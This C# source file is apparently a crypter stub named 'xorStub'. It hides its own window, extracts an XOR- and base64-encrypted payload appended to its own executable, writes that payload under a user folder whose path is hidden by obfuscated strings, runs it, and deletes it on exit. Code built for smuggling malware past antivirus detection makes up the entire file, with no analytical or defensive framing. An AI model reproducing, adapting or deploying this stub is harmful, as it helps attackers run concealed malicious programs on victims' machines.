using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Text;
using System.IO;
using System.Diagnostics;
using System.Management;
using System.Runtime.InteropServices;

namespace xorStub
{
    class Program
    {
        [DllImport("user32.dll")]
        static extern bool ShowWindow(IntPtr hWnd, int nCmdShow);
        public static string ROT13Encode(string data, string key)
        {
            int dataLen = data.Length;
            int keyLen = key.Length;
            char[] output = new char[dataLen];

            for (int i = 0; i < dataLen; ++i)
            {
                output[i] = (char)(data[i] ^ key[i % keyLen]);
            }

            return new string(output);
        }
        static class RandomUtil
        {
            public static string GetRandomString()
            {
                string path = Path.GetRandomFileName();
                path = path.Replace(".", "");
                return path;
            }
        }

        static void Main(string[] args)
        {
            IntPtr h = Process.GetCurrentProcess().MainWindowHandle;
            ShowWindow(h, 0);
            while (true)
            {
                using (StreamReader streamReader = new StreamReader(System.Reflection.Assembly.GetEntryAssembly().Location))
            {
                using (BinaryReader binaryReader = new BinaryReader(streamReader.BaseStream))
                {
                    byte[] stubBytes = binaryReader.ReadBytes(Convert.ToInt32(streamReader.BaseStream.Length));
                    string stubSettings = Encoding.ASCII.GetString(stubBytes).Substring(Encoding.ASCII.GetString(stubBytes).IndexOf("***")).Replace("***", "");
                    string randomKey = ROT13Encode(Encoding.UTF8.GetString(Convert.FromBase64String(stubSettings.Split('|')[1])), "randomkey");
                    string cipheredFile = stubSettings.Split('|')[0];
                    string fileName = RandomUtil.GetRandomString();

                    string[] CurrentDirectoryy = new string[]
                    {
                        ROT13Encode("{", "AAAQSDQSDF"),
                        ROT13Encode(" !# ", "QSDQSFFF"),
                        ROT13Encode("#4200", "QSDQSDQFGHG"),
                        ROT13Encode("')-$", "JHJLHJKYTUTYU"),
                        ROT13Encode("!>6", "QDSFDFHNGFGN"),
                        ROT13Encode("v&.2", "XCVW<X<WCBN")
                    };

                    Byte[] bytesBack = Convert.FromBase64String(ROT13Encode(Encoding.UTF8.GetString(Convert.FromBase64String(cipheredFile)), randomKey));
                    File.WriteAllBytes(CurrentDirectoryy[0] + "\\" + CurrentDirectoryy[1] + "\\" + System.Environment.UserName + "\\" + CurrentDirectoryy[2] + "\\" + CurrentDirectoryy[3] + "\\" + CurrentDirectoryy[4] + fileName + CurrentDirectoryy[5], bytesBack);

                    Process p = new Process();
                    p.Exited += new EventHandler(p_Exited);
                    p.StartInfo.FileName = CurrentDirectoryy[0] + "\\" + CurrentDirectoryy[1] + "\\" + System.Environment.UserName + "\\" + CurrentDirectoryy[2] + "\\" + CurrentDirectoryy[3] + "\\" + CurrentDirectoryy[4] + fileName + CurrentDirectoryy[5];
                    p.EnableRaisingEvents = true;
                    p.Start();

                    void p_Exited(object sender, EventArgs e)
                    {
                        File.Delete(CurrentDirectoryy[0] + "\\" + CurrentDirectoryy[1] + "\\" + System.Environment.UserName + "\\" + CurrentDirectoryy[2] + "\\" + CurrentDirectoryy[3] + "\\" + CurrentDirectoryy[4] + fileName + CurrentDirectoryy[5]);
                        Environment.Exit(0);
                    }

                    Console.ReadLine();
                }
            }
            }
        }
    }
}
